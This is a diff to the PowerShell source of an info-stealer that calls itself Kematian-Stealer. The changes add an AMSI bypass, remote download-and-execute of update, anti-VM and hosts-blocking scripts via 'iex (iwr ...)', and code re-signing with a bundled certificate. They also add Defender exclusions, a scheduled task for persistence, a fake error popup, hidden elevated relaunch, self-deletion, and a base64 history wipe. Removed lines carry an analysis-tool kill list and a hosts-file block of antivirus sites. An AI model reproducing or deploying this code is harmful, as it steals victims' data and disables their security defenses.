@@ -1,4 +1,10 @@
 $debug = $false
+$autoupdate = $false
+$blockhostsfile = $true
+$criticalprocess = $false
+$melt = $true
+$fakeerror = $false
+$persistence = $true
 
 if ($debug) {
     $ProgressPreference = 'Continue'
@@ -9,6 +15,7 @@ else {
 }
 
 function KDMUTEX {
+	if ($fakeerror ) {Add-Type -AssemblyName System.Windows.Forms;[System.Windows.Forms.MessageBox]::Show("The program can't start because MSVCP110.dll is missing from your computer. Try reinstalling the program to fix this problem.",'','OK','Error')}
     $AppId = "a0e59cd1-5d22-4ae1-967b-1bf3e1d36d6b" 
     $CreatedNew = $false
     $script:SingleInstanceEvent = New-Object Threading.EventWaitHandle $true, ([Threading.EventResetMode]::ManualReset), "Global\$AppID", ([ref] $CreatedNew)
@@ -20,7 +27,7 @@ function KDMUTEX {
             Invoke-TASKS
         }
         else {
-            VMBYPASSER
+            VMPROTECT
         }
     }
 }
@@ -30,6 +37,26 @@ Add-Type -AssemblyName PresentationCore, PresentationFramework
 $webhook = "YOUR_WEBHOOK_HERE"
 $avatar = "https://i.imgur.com/DOIYOtp.gif"
 
+# This will overwrite the file at runtime therefore updating it before it exfiltrates
+function AUTOUPDATE {
+    if ($autoupdate) { 
+        $updateandrun = Invoke-WebRequest -Uri "https://github.com/ChildrenOfYahweh/Kematian-Stealer/raw/main/frontend-src/main.ps1" 
+        $updateandrun -replace "YOUR_WEBHOOK_HERE", $webhook | Out-File -FilePath $pscommandpath -Encoding ASCII
+        $url = "https://github.com/Chainski/Kematian-Stealer/raw/main/frontend-src/Kematian.pfx"
+        $outputPath = "$env:tmp\Kematian.pfx"
+		if (Test-Path $outputPath) {Remove-Item $outputPath -Force}
+        Invoke-WebRequest -Uri $url -OutFile $outputPath 
+        $certificatePath = $outputPath
+        $certificatePassword = ConvertTo-SecureString -String "Kematian" -AsPlainText -Force
+        $certificate = New-Object System.Security.Cryptography.X509Certificates.X509Certificate2($certificatePath, $certificatePassword)
+        Set-AuthenticodeSignature -FilePath $pscommandpath -Certificate $certificate -TimestampServer "http://timestamp.comodoca.com"
+        iex $pscommandpath
+    }
+    else {
+        
+        KDMUTEX
+    }
+}
 
 #THIS CODE WAS MADE BY EvilByteCode
 Add-Type -TypeDefinition @"
@@ -57,182 +84,36 @@ public static class ProcessUtility
 #END OF CODE MADE BY EvilByteCode
 
 # Request admin with AMSI bypass
-function INVOKE-AC {
+function CHECK_AND_PATCH {
     ${kDOt} = [Ref].Assembly.GetType('System.Management.Automation.Am' + 'siUtils').GetField('am' + 'siInitFailed', 'NonPublic,Static');
     ${CHaINSki} = [Text.Encoding]::ASCII.GetString([Convert]::FromBase64String("JGtkb3QuU2V0VmFsdWUoJG51bGwsJHRydWUp")) | &([regex]::Unescape("\u0069\u0065\u0078"))
     $kdotcheck = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltinRole]::Administrator)
     return $kdotcheck
 }
 
-function Hide-Console {
-    if (-not ("Console.Window" -as [type])) { 
-        Add-Type -Name Window -Namespace Console -MemberDefinition '
-            [DllImport("Kernel32.dll")]
-            public static extern IntPtr GetConsoleWindow();
-            [DllImport("user32.dll")]
-            public static extern bool ShowWindow(IntPtr hWnd, Int32 nCmdShow);
-            '
-    }
-    $consolePtr = [Console.Window]::GetConsoleWindow()
-    $null = [Console.Window]::ShowWindow($consolePtr, 0)
-}
-
-function make_error_page {
-    param(
-        [Parameter(Mandatory = $true)]
-        [string]$error_message
-    )
-    $null = [System.Windows.MessageBox]::Show("$error_message", "ERROR", 0, 16)
-}
-
-function Search-Mac ($mac_addresses) {
-    $pc_mac = Get-WmiObject win32_networkadapterconfiguration -ComputerName $env:COMPUTERNAME | Where-Object { $_.IpEnabled -Match "True" } | Select-Object -ExpandProperty macaddress -join ","
-    return $mac_addresses -contains $pc_mac
-}
-
-function Search-IP ($ip_addresses) {
-    $pc_ip = Invoke-WebRequest -Uri "https://api.ipify.org" -UseBasicParsing
-    $pc_ip = $pc_ip.Content
-    return $ip_addresses -contains $pc_ip
-}
-
-function Search-HWID ($hwids) {
-    $pc_hwid = Get-WmiObject -Class Win32_ComputerSystemProduct | Select-Object -ExpandProperty UUID
-    return $hwids -contains $pc_hwid
-}
-
-function Search-Username ($usernames) {
-    $pc_username = $env:USERNAME
-    return $usernames -contains $pc_username
-}
-
-function ram_check {
-    $ram = (Get-WmiObject -Class Win32_PhysicalMemory | Measure-Object -Property capacity -Sum).Sum / 1GB
-    if ($ram -lt 4) {
-        make_error_page "[!] RAM CHECK FAILED" -ForegroundColor Red
-        Start-Sleep -Seconds 3
-        exit
-    }
-}
-
-function VMBYPASSER {
-    ram_check
-    $processnames = @(
-        "autoruns",
-        "die",
-        "dumpcap",
-        "dumpcap",
-        "fakenet",
-        "fiddler",
-        "filemon",
-        "hookexplorer",
-        "httpdebugger",
-        "immunitydebugger",
-        "importrec",
-        "joeboxcontrol",
-        "joeboxserver",
-        "lordpe",
-        "ollydbg",
-        "petools",
-        "proc_analyzer",
-        "processhacker",
-        "procexp",
-        "procmon",
-        "qemu-ga",
-        "qga",
-        "resourcehacker",
-        "sandman",
-        "scylla_x64",
-        "sysanalyzer",
-        "sysinspector",
-        "sysmon",
-        "tcpview",
-        "tcpview64",
-        "tcpdump",
-        "vboxservice",
-        "vboxtray",
-        "vboxcontrol",
-        "vmacthlp",
-        "vmwareuser",
-        "windbg",
-        "wireshark",
-        "x32dbg",
-        "x64dbg",
-        "xenservice"
-    )
-    $detectedProcesses = Get-Process -Name $processnames -ErrorAction SilentlyContinue | Select-Object -ExpandProperty Name
-
-    if ($detectedProcesses) { 
-        Write-Output "Detected processes: $($detectedProcesses -join ', ')"
-        Exit 1
-    }
-    else { 
-        Invoke-ANTITOTAL
-    }
-}
-
-function Invoke-ANTITOTAL {
-    $urls = @(
-        "https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/mac_list.txt",
-        "https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/ip_list.txt",
-        "https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/hwid_list.txt",
-        "https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/pc_username_list.txt"
-    )
-    $functions = @(
-        "Search-Mac",
-        "Search-IP",
-        "Search-HWID",
-        "Search-Username"
-    )
-    
-    for ($i = 0; $i -lt $urls.Count; $i++) {
-        $url = $urls[$i]
-        $functionName = $functions[$i]
-        
-        $result = Invoke-WebRequest -Uri $url -UseBasicParsing
-        if ($result.StatusCode -eq 200) {
-            $content = $result.Content
-            $function = Get-Command -Name $functionName
-            $output = & $function.Name $content
-            
-            if ($output -eq $true) {
-                make_error_page "[!] Detected VM" -ForegroundColor Red
-                Start-Sleep -s 3
-                exit
-            }
-        }
-    } 
-
+function VMPROTECT {
+if ($criticalprocess) {
+	$link = ("https://github.com/Chainski/Kematian-Stealer/raw/main/frontend-src/antivm.ps1")
+	iex (iwr -uri $link -useb)
     [ProcessUtility]::MakeProcessCritical()
-    Invoke-TASKS
+	Invoke-TASKS
+	}
+ else {
+	 $link = ("https://github.com/Chainski/Kematian-Stealer/raw/main/frontend-src/antivm.ps1")
+	 iex (iwr -uri $link -useb)
+     Invoke-TASKS
+   }
 }
-
-function HOSTS-BLOCKER {
-    $KDOT = Select-String -Path "$env:windir\System32\Drivers\etc\hosts" -Pattern "GODFATHER"
-    if ($KDOT -ne $null) {}else {
-        Add-Content c:\Windows\System32\Drivers\etc\hosts "`n#GODFATHER `n0.0.0.0 www.malwarebytes.com`n0.0.0.0 malwarebytes.com`n0.0.0.0 143.204.176.32`n0.0.0.0 www.antivirussoftwareguide.com`n0.0.0.0 antivirussoftwareguide.com`n0.0.0.0 68.183.21.156`n0.0.0.0 www.norton.com`n0.0.0.0 norton.com`n0.0.0.0 23.99.92.83`n0.0.0.0 www.avg.com`n0.0.0.0 avg.com`n0.0.0.0 69.94.64.29`n0.0.0.0 www.eset.com`n0.0.0.0 eset.com`n0.0.0.0 91.228.167.128`n0.0.0.0 www.avast.com`n0.0.0.0 avast.com`n0.0.0.0 2.22.100.83`n0.0.0.0 www.uk.pcmag.com`n0.0.0.0 uk.pcmag.com`n0.0.0.0 104.17.101.99`n0.0.0.0 www.bitdefender.co.uk`n0.0.0.0 bitdefender.co.uk`n0.0.0.0 172.64.144.176`n0.0.0.0 www.webroot.com`n0.0.0.0 webroot.com`n0.0.0.0 66.35.53.194`n0.0.0.0 www.mcafee.com`n0.0.0.0 mcafee.com`n0.0.0.0 161.69.29.243`n0.0.0.0 www.eset.com`n0.0.0.0 eset.com`n0.0.0.0 91.228.167.128`n0.0.0.0 www.go.crowdstrike.com`n0.0.0.0 go.crowdstrike.com`n0.0.0.0 104.18.64.82`n0.0.0.0 www.sophos.com`n0.0.0.0 sophos.com`n0.0.0.0 23.198.89.209`n0.0.0.0 www.f-secure.com`n0.0.0.0 f-secure.com`n0.0.0.0 23.198.76.113`n0.0.0.0 www.gdatasoftware.com`n0.0.0.0 gdatasoftware.com`n0.0.0.0 212.23.151.164`n0.0.0.0 www.trendmicro.com`n0.0.0.0 trendmicro.com`n0.0.0.0 216.104.20.24`n0.0.0.0 www.virustotal.com`n0.0.0.0 virustotal.com`n0.0.0.0 216.239.32.21`n0.0.0.0 www.acronis.com`n0.0.0.0 acronis.com`n0.0.0.0 34.120.97.237`n0.0.0.0 www.adaware.com`n0.0.0.0 adaware.com`n0.0.0.0 104.16.236.79`n0.0.0.0 www.ahnlab.com`n0.0.0.0 ahnlab.com`n0.0.0.0 211.233.80.53`n0.0.0.0 www.antiy.net`n0.0.0.0 antiy.net`n0.0.0.0 47.91.137.195`n0.0.0.0 www.symantec.com`n0.0.0.0 symantec.com`n0.0.0.0 50.112.202.115`n0.0.0.0 www.broadcom.com`n0.0.0.0 broadcom.com`n0.0.0.0 50.112.202.115`n0.0.0.0 www.superantispyware.com`n0.0.0.0 superantispyware.com`n0.0.0.0 44.231.57.118`n0.0.0.0 www.sophos.com`n0.0.0.0 sophos.com`n0.0.0.0 23.198.89.209`n0.0.0.0 www.sangfor.com`n0.0.0.0 sangfor.com`n0.0.0.0 151.101.2.133`n0.0.0.0 www.rising-global.com`n0.0.0.0 rising-global.com`n0.0.0.0 219.238.233.230`n0.0.0.0 www.webroot.com`n0.0.0.0 webroot.com`n0.0.0.0 66.35.53.194`n0.0.0.0 www.wearethinc.com`n0.0.0.0 wearethinc.com`n0.0.0.0 217.199.161.10`n0.0.0.0 www.cybernews.com`n0.0.0.0 cybernews.com`n0.0.0.0 172.66.43.197`n0.0.0.0 www.quickheal.com`n0.0.0.0 quickheal.com`n0.0.0.0 103.228.50.23`n0.0.0.0 www.pandasecurity.com`n0.0.0.0 pandasecurity.com`n0.0.0.0 91.216.218.44`n0.0.0.0 www.trendmicro.com`n0.0.0.0 trendmicro.com`n0.0.0.0 216.104.20.24`n0.0.0.0 www.guard.io`n0.0.0.0 guard.io`n0.0.0.0 34.102.139.130`n0.0.0.0 www.maxpcsecure.com`n0.0.0.0 maxpcsecure.com`n0.0.0.0 70.35.199.101`n0.0.0.0 www.maxsecureantivirus.com`n0.0.0.0 maxsecureantivirus.com`n0.0.0.0 70.35.199.101`n0.0.0.0 www.akamai.com`n0.0.0.0 akamai.com`n0.0.0.0 104.82.181.162`n0.0.0.0 www.lionic.com`n0.0.0.0 lionic.com`n0.0.0.0 220.130.53.233`n0.0.0.0 www.ccm.net`n0.0.0.0 ccm.net`n0.0.0.0 23.55.12.105`n0.0.0.0 www.kaspersky.co.uk`n0.0.0.0 kaspersky.co.uk`n0.0.0.0 185.85.15.26`n0.0.0.0 www.crowdstrike.com`n0.0.0.0 crowdstrike.com`n0.0.0.0 104.18.64.82`n0.0.0.0 www.k7computing.com`n0.0.0.0 k7computing.com`n0.0.0.0 52.172.54.225`n0.0.0.0 www.softonic.com`n0.0.0.0 softonic.com`n0.0.0.0 35.227.233.104`n0.0.0.0 www.ikarussecurity.com`n0.0.0.0 ikarussecurity.com`n0.0.0.0 91.212.136.200`n0.0.0.0 www.gridinsoft.com`n0.0.0.0 gridinsoft.com`n0.0.0.0 104.26.9.187`n0.0.0.0 www.simspace.com`n0.0.0.0 simspace.com`n0.0.0.0 104.21.82.22`n0.0.0.0 www.osirium.com`n0.0.0.0 osirium.com`n0.0.0.0 35.197.237.129`n0.0.0.0 www.gdatasoftware.co.uk`n0.0.0.0 gdatasoftware.co.uk`n0.0.0.0 212.23.151.164`n0.0.0.0 www.gdatasoftware.com`n0.0.0.0 gdatasoftware.com`n0.0.0.0 212.23.151.164`n0.0.0.0 www.basicsprotection.com`n0.0.0.0 basicsprotection.com`n0.0.0.0 3.111.153.145`n0.0.0.0 www.fortinet.com`n0.0.0.0 fortinet.com`n0.0.0.0 3.1.92.70`n0.0.0.0 www.f-secure.com`n0.0.0.0 f-secure.com`n0.0.0.0 23.198.76.113`n0.0.0.0 www.eset.com`n0.0.0.0 eset.com`n0.0.0.0 91.228.167.128`n0.0.0.0 www.escanav.com`n0.0.0.0 escanav.com`n0.0.0.0 67.222.129.224`n0.0.0.0 www.emsisoft.com`n0.0.0.0 emsisoft.com`n0.0.0.0 104.20.206.62`n0.0.0.0 www.drweb.com`n0.0.0.0 drweb.com`n0.0.0.0 178.248.233.94`n0.0.0.0 www.cyren.com`n0.0.0.0 cyren.com`n0.0.0.0 216.163.188.84`n0.0.0.0 www.cynet.com`n0.0.0.0 cynet.com`n0.0.0.0 172.67.38.94`n0.0.0.0 www.comodosslstore.com`n0.0.0.0 comodosslstore.com`n0.0.0.0 172.67.28.161`n0.0.0.0 www.clamav.net`n0.0.0.0 clamav.net`n0.0.0.0 198.148.79.54`n0.0.0.0 www.eset.com`n0.0.0.0 eset.com`n0.0.0.0 91.228.167.128`n0.0.0.0 www.totalav.com`n0.0.0.0 totalav.com`n0.0.0.0 34.117.198.220`n0.0.0.0 www.bitdefender.co.uk`n0.0.0.0 bitdefender.co.uk`n0.0.0.0 172.64.144.176`n0.0.0.0 www.baidu.com`n0.0.0.0 baidu.com`n0.0.0.0 39.156.66.10`n0.0.0.0 www.avira.com`n0.0.0.0 avira.com`n0.0.0.0 52.58.28.12`n0.0.0.0 www.avast.com`n0.0.0.0 avast.com`n0.0.0.0 2.22.100.83`n0.0.0.0 www.arcabit.pl`n0.0.0.0 arcabit.pl`n0.0.0.0 188.166.107.22`n0.0.0.0 www.surfshark.com`n0.0.0.0 surfshark.com`n0.0.0.0 104.18.120.34`n0.0.0.0 www.nordvpn.com`n0.0.0.0 nordvpn.com`n0.0.0.0 104.17.49.74`n0.0.0.0 support.microsoft.com`n0.0.0.0 www.support.microsoft.com`n"
-    }
-    $Browsers = @("chrome", "firefox", "iexplore", "opera", "brave", "msedge")
-    $terminatedProcesses = @()
-    foreach ($browser in $Browsers) {
-        $process = Get-Process -Name $browser -ErrorAction 'SilentlyContinue'
-        if ($process -ne $null) {
-            Stop-Process -Name $browser -ErrorAction 'SilentlyContinue' -Force
-            $terminatedProcesses += $browser
-        }
-    }
-}
-
 
 
 function Request-Admin {
-    while (-not (INVOKE-AC)) {
-        try {
-            Start-Process "powershell.exe" -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`"" -Verb RunAs
-            exit
-        }
-        catch {}
+ while (-not (CHECK_AND_PATCH)) {if ($debug -eq $true) {
+        try {Start-Process "powershell" -ArgumentList "-NoP -Ep Bypass -File `"$PSCommandPath`"" -Verb RunAs;exit} catch {}
     }
+    else {
+        try {Start-Process "powershell" -ArgumentList "-Win Hidden -NoP -Ep Bypass -File `"$PSCommandPath`"" -Verb RunAs;exit} catch {}
+    } 
+ }	
 }
 
 function Backup-Data {
@@ -1233,10 +1114,13 @@ FileZilla: $filezilla_info
 	# cleanup
     Remove-Item "$env:LOCALAPPDATA\Temp\Kematian.zip" -Force
     Remove-Item "$folder_general" -Force -Recurse
+	Remove-Item "$env:tmp\Kematian.pfx" -Force 
 }
 
 function Invoke-TASKS {
     Add-MpPreference -ExclusionPath "$env:LOCALAPPDATA\Temp"
+	if ($persistence) {
+	Add-MpPreference -ExclusionPath "$env:LOCALAPPDATA\Temp"	
     Add-MpPreference -ExclusionPath "$env:APPDATA\Kematian"
     New-Item -ItemType Directory -Path "$env:APPDATA\Kematian" -Force
     # Hidden Directory
@@ -1249,21 +1133,24 @@ function Invoke-TASKS {
     $task_settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -RunOnlyIfNetworkAvailable -DontStopOnIdleEnd -StartWhenAvailable
     Register-ScheduledTask -Action $task_action -Trigger $task_trigger -Settings $task_settings -TaskName $task_name -Description "Kematian" -RunLevel Highest -Force
     Write-Host "[!] Task Created" -ForegroundColor Green
-
-    HOSTS-BLOCKER
+	}
+    if ($blockhostsfile) {
+	$link = ("https://github.com/Chainski/Kematian-Stealer/raw/main/frontend-src/blockhosts.ps1")
+	iex (iwr -uri $link -useb)
+    
+    }
     Backup-Data
 }
 
-if (INVOKE-AC -eq $true) {
+if (CHECK_AND_PATCH -eq $true) {
     if ($debug -eq $true) {
-        KDMUTEX
+        AUTOUPDATE
     }
     else {
-        Hide-Console
         KDMUTEX
     }    
     if ($debug) {
-        Start-Sleep -Seconds 50
+        pause
     } else {
         [ProcessUtility]::MakeProcessKillable()
     }
@@ -1271,7 +1158,7 @@ if (INVOKE-AC -eq $true) {
     $script:SingleInstanceEvent.Dispose()
     #removes history
     I'E'X([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String("UmVtb3ZlLUl0ZW0gKEdldC1QU3JlYWRsaW5lT3B0aW9uKS5IaXN0b3J5U2F2ZVBhdGggLUZvcmNlIC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVl")))
-    Exit 0
+    if ($melt) {ri $pscommandpath -force}
 } else {
     Write-Host ("[!] Please run as admin!") -ForegroundColor Red
     Start-Sleep -s 1
@@ -1280,24 +1167,24 @@ if (INVOKE-AC -eq $true) {
 # SIG # Begin signature block
 # MIIWogYJKoZIhvcNAQcCoIIWkzCCFo8CAQExCzAJBgUrDgMCGgUAMGkGCisGAQQB
 # gjcCAQSgWzBZMDQGCisGAQQBgjcCAR4wJgIDAQAABBAfzDtgWUsITrck0sYpfvNR
-# AgEAAgEAAgEAAgEAAgEAMCEwCQYFKw4DAhoFAAQUmIxFEVw9uiCfASYjBUleYKEN
-# OBigghDvMIIDAjCCAeqgAwIBAgIQaKhtjtvfIIdBopGUVz0unDANBgkqhkiG9w0B
-# AQsFADAZMRcwFQYDVQQDDA5LZW1hdGlhbiwgSW5jLjAeFw0yNDA1MDYxNzMwNDda
-# Fw0zNDA1MDYxNzQwNDdaMBkxFzAVBgNVBAMMDktlbWF0aWFuLCBJbmMuMIIBIjAN
-# BgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAuxdsbCCWONTcaSEK9QrABN9HCBNB
-# 7kjCu6yllxcHOI5OsNIqrMNcvVRQY7y78vw4rEileif95iiztMZj2ZH8fJP1aNZb
-# 8F0KATxSuMzq9ZpYQnYAX2QQpMdDDXuV3wnPtVe2SgQ8vxZ33cqrhmnm6EL4GZ0r
-# JJDqaHlrDoiQmIiajrS2YgWumAE9+NmKrEJUklsoCKVT/GDmFUdCQ9k6vTQpy52W
-# teAjHWEl7KbkZ+dMh5GlraBdxyrRPS1ACDv/QdJvHb7NoSIOvidg6qdKop4fY/Qn
-# 0MhU7LLfhxzZuOhA+/0438GjsiN1iQAjJmSZIyuC5lqPkWqUP6U5hyxXnQIDAQAB
+# AgEAAgEAAgEAAgEAAgEAMCEwCQYFKw4DAhoFAAQUt5U91UptXdWFW/rKXBG1/Hcf
+# H7qgghDvMIIDAjCCAeqgAwIBAgIQQWmfkCdPgq5NjgKQlpxwcjANBgkqhkiG9w0B
+# AQsFADAZMRcwFQYDVQQDDA5LZW1hdGlhbiwgSW5jLjAeFw0yNDA1MTIxODM3MTha
+# Fw0zNDA1MTIxODQ3MThaMBkxFzAVBgNVBAMMDktlbWF0aWFuLCBJbmMuMIIBIjAN
+# BgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAtlJrIO0fS3oH8OmTeElwKQS0NLUC
+# w1qXy7PNTXekVGdQi62mzVELs9Ad+cI2ZjdQB6/kW/LQupzsiN/nRn95qbacZR0o
+# Wz1deboWCD22Ua3uX0IvNxXlU3qsVUdkZOym9SOdS9ZNyGiB+S3sBLCO1idY6kYg
+# OeRPnriBcyQbG7siQJgfYr9P/iFeNMDNKtwfOLrK4zzOomEUxJylBW3ciHhKLVg9
+# sabDWa/3qIgMY1RhPyRNiT0TknFIfsX57fiE/RdeyEEBvcSdy4ktF6sANV9PAUgH
+# GW+KBLxtyv/4DyRf90nMDLCVvzhQs+CtuOIIrCrZLqRjSQdPrgEUAe6xGQIDAQAB
 # o0YwRDAOBgNVHQ8BAf8EBAMCB4AwEwYDVR0lBAwwCgYIKwYBBQUHAwMwHQYDVR0O
-# BBYEFIWRfaN6ReKhtPhKLYXv8CDiZpkeMA0GCSqGSIb3DQEBCwUAA4IBAQA0t0aP
-# 1Gf42CEzzdtV3vXWDgvhxJ1+2fMQhU85DVgIP3Ors6RGqPNE2SN4/HOLahF/OWO8
-# RFIphAc0gFkSJ3EpR8jKmSRRER5gTuh4X2ONzo3OQKC2Fl0p+BHixd+OieM5MsCi
-# G3e8XE5L53JVWpNU8vfJfEFMD60nWKLq8w1g4nVZeExWbL7PCtLomisjHGDXB30w
-# 0WDdM3PyNG/Z1iiB2o0ViR5wot0b24+dGNtg5zf09UA1kgD1PBrBkDorhLMr+Rf1
-# pLQBivGGSkNGqA58sAGja09nh6/M9gvKnbWuLwgmL2ifoBko0mmGFQ1tJfHQmatL
-# f7fYs5mQEm3U2PBuMIIG7DCCBNSgAwIBAgIQMA9vrN1mmHR8qUY2p3gtuTANBgkq
+# BBYEFIzsnMOzqKL+dnDEQfmwhy70CqcCMA0GCSqGSIb3DQEBCwUAA4IBAQCm2nV7
+# u4hJJnPHTiD49hkSNF0zN95s88K/2GQuyiA0ZyjK/snGC4pfTuQKM+I5xDaahreR
+# Meml+4TrHWIPj6zkHOk1HpjKr4qaCMuveoClzgz9PczFPR8kaF1SkGlA840EbvIk
+# KBjTw0lfYNXzXD9RQSWjwiAAGLE1r/NuNiFIznOxKb6+j8JwVOjQvm1DGtxQyH+V
+# IDaaZELS9MaYIZQlZDE+L1itgYaiRoJcA5Mulxsfh6NbyW0UH3q3t0DR3M5CxAc6
+# Sc2Fja9skCQPxiTzEfpC6Urqbe6/abP0x2H8bT3lFhQLfgnZA3+yzwAv5ZXPSjk0
+# myzbQ/lUCDe5bW+yMIIG7DCCBNSgAwIBAgIQMA9vrN1mmHR8qUY2p3gtuTANBgkq
 # hkiG9w0BAQwFADCBiDELMAkGA1UEBhMCVVMxEzARBgNVBAgTCk5ldyBKZXJzZXkx
 # FDASBgNVBAcTC0plcnNleSBDaXR5MR4wHAYDVQQKExVUaGUgVVNFUlRSVVNUIE5l
 # dHdvcmsxLjAsBgNVBAMTJVVTRVJUcnVzdCBSU0EgQ2VydGlmaWNhdGlvbiBBdXRo
@@ -1372,31 +1259,31 @@ if (INVOKE-AC -eq $true) {
 # jbf3E7TtoC3ucw/ZELqdmSx813UfjxDElOZ+JOWVSoiMJ9aFZh35rmR2kehI/shV
 # Cu0pwx/eOKbAFPsyPfipg2I2yMO+AIccq/pKQhyJA9z1XHxw2V14Tu6fXiDmCWp8
 # KwijSPUV/ARP380hHHrl9Y4a1LlAMYIFHTCCBRkCAQEwLTAZMRcwFQYDVQQDDA5L
-# ZW1hdGlhbiwgSW5jLgIQaKhtjtvfIIdBopGUVz0unDAJBgUrDgMCGgUAoHgwGAYK
+# ZW1hdGlhbiwgSW5jLgIQQWmfkCdPgq5NjgKQlpxwcjAJBgUrDgMCGgUAoHgwGAYK
 # KwYBBAGCNwIBDDEKMAigAoAAoQKAADAZBgkqhkiG9w0BCQMxDAYKKwYBBAGCNwIB
 # BDAcBgorBgEEAYI3AgELMQ4wDAYKKwYBBAGCNwIBFTAjBgkqhkiG9w0BCQQxFgQU
-# g9+lpgEfIwjHOvtkQhnAoTh7j/0wDQYJKoZIhvcNAQEBBQAEggEAIpH7QCCcnEdG
-# 1r+tLcJQRFZwPiQX3Xb2YCJjAQazbJhR+CvO3L1EY1bUYbZd3VyZreN4jhrQ5peh
-# +EKDpp3FfcCsJHqWlkHPRxOvZPBSghtstd2IVkEbPKp7DyJFyB+iGsXWVe2nwBOZ
-# jipZ23XGxDOMd9djknplGo3z4FgV+K1VPajXqiltLQwLCpr6GMHGXpNKFDVAkU5c
-# LIROnb7H6TT9UWAKfNdeYaznOUTjhECqhib5UWqADHOzdgzKCI/OunVoG3tOsRVz
-# Z5avKxETIoUqmRDuZ3rX2E4gV2vMFWIIPJmViDvK6HbqiPrR8CfgrhdT2vme+9m2
-# FLdyAwZAlqGCA0swggNHBgkqhkiG9w0BCQYxggM4MIIDNAIBATCBkTB9MQswCQYD
+# LV1jmC3eiLa8sawQdECfeirYoskwDQYJKoZIhvcNAQEBBQAEggEAIAhwSQBYlRcF
+# M5V5Bdanc+0T8l+dMqMSBXt9C1KsUaSJWk3Unq54VG3gMMq2dbI15cg5jxUytSAf
+# XKI/L/+hEevnAu8TEp27hI+I6F0KAD5jb/xCd7ZwGynky/aqawaUrLOygsrV5xfv
+# a60NBtdKvpe63W6TD5aKvl0bjd3Cbl9oBPki7EEpBJNf2tT7Jl1/l0wi6LQmOUyr
+# iTFcGUUDT5aAjjhBVLhwppqPvpVjD2YXeaqrgA4dMz1z+hpVqJVetoUjB4CRylqm
+# vwL65IgyN49vwsu0Rk51ek2KBJXPauYdaOw8z6tsrC67GV1VpLs+SF1ykFByhxI5
+# 4elawJs+SqGCA0swggNHBgkqhkiG9w0BCQYxggM4MIIDNAIBATCBkTB9MQswCQYD
 # VQQGEwJHQjEbMBkGA1UECBMSR3JlYXRlciBNYW5jaGVzdGVyMRAwDgYDVQQHEwdT
 # YWxmb3JkMRgwFgYDVQQKEw9TZWN0aWdvIExpbWl0ZWQxJTAjBgNVBAMTHFNlY3Rp
 # Z28gUlNBIFRpbWUgU3RhbXBpbmcgQ0ECEDlMJeF8oG0nqGXiO9kdItQwDQYJYIZI
 # AWUDBAICBQCgeTAYBgkqhkiG9w0BCQMxCwYJKoZIhvcNAQcBMBwGCSqGSIb3DQEJ
-# BTEPFw0yNDA1MDYxNzQwNTBaMD8GCSqGSIb3DQEJBDEyBDChxt2QMbitYr5oP+Mr
-# GsdlupRwNqc4JhMTk/3PdHb0G6kI4A1k2a3Q6kkZbXDTLvAwDQYJKoZIhvcNAQEB
-# BQAEggIAnKF0ZNq07gS20u+D6+juyiTvpQoEY86AHhCKHaGfEbVN3IQICZpW9AEs
-# V59PLnKXceGetqSjT9LcVW0dlr6g4zf9kyr1O+k+/aqhpQVub00dBj4nxEPXSskH
-# N9DcetNKfHs3M5U6fPZ9MTvsRg6IKKeGIPWXW7ZKnuGlo5dZheAH4tDgmwAIDb/t
-# 6J3f9qHUrwLM7oreIdDg6YFE33TEim6VlJ1L2e5w+fgjfv+h1wSXPs40dJcXVzv5
-# zoURZtQQrXyKJMCEPO9AlFXWnyLB+JdeuJoCBkP9IXJ+nnVGLLba8k1y70EvXsXd
-# 32MCKhYFIjtI0Jwcq2b8DlBXaPUZfpSueuJ0qtVPFQNZns64CcJilaXXJjiXcEyr
-# vm+6JgD0ydv9sK0WQ4Mt0KgTgetUXZWJiA8maFzQ/7L3o5qgjt+77g5eolkCijPU
-# a0KfKApVSaIW3nsuYz93P+q2tQhSGLxwgTQQteQ1eKVAX1aQy5O00bqzeqaWM8lp
-# jZRYR3S6FrV36Y704jgPqX7J8oKrYvBJsdVR5ePpLRhUYDxXxtv2yIGG+HZRGU7R
-# FfR1cdfJIKTsjhwpQ9fUamKnApIKq8TT4B3PsBYGpo3qGXTWgp2H+SKk/vPwDMKl
-# sYMGGX9RtHZUhwcUK/toSJrsUxpi3TSsT2Y7sVBJB5zSn1ublmg=
+# BTEPFw0yNDA1MTIxOTI4NDVaMD8GCSqGSIb3DQEJBDEyBDAkK8JHgGc1wSIWbNxO
+# q/HLZ4ZscLAUt+VnBajZu4U3sifFTF28P0mzh6YeBF8ffREwDQYJKoZIhvcNAQEB
+# BQAEggIAWhTSUk/edbrUbBUejifn3liXQmxIwF39cAde7umLv+mxLN20nMVQSUsX
+# O+JNgjWdwwPXwOnCm5qnZcEfM/iNjxXqodChpCuGo995aKFAkGTNIr7BMW2oeUMr
+# ZccNY4RLyFkwh1mdLO08H8aFQmWvlWkBbVG/8amWzpuYYo4cyQ5RQ/KiXjwXbvyg
+# 4q4qFS0CmFLjJEGdKn1/XIQqczz9hsv9nMfW6u3vIBwNqUDLq2q5zNu6L9YiRFyx
+# +u/l8FPDgSssXRgdlapBpMe6ffYQvwiIQTqPLJgsR/exCfqDvYvA75L+WPYugZDg
+# 5lFpHjuiszK6IKvynuMCNZfimTN3tMpd7MOrJarlhXj5BZDMiNTfskl6T16VqPE8
+# kMVu9zS1DzZC6sEFgNc/lmP+JF0OH+PKunhflbh3c8FMfvf8OChFoig0Pf1/+TcN
+# XGI0Kw8hOFTz+fz9Yi5BnFKXX+cYuRPzMAej1Q1LDKMRuz4F46s3TVuq2OMCiqHy
+# 7Hp1RV9A8TYx98o3qJrf21kA+M4nMR2uYMDy4tlUyw75nEoMCNk3+/pTYBkahi2T
+# bvtZezDIdaGhWmqJW2lSlcRSVqELa+4KpWAi1JzQIXMlCChONhg2qjfseNP4lEtz
+# cnO8qAsGdFWRPE6OA5tR3BvsSvl56nItsYZbua51kwocf58lJYk=
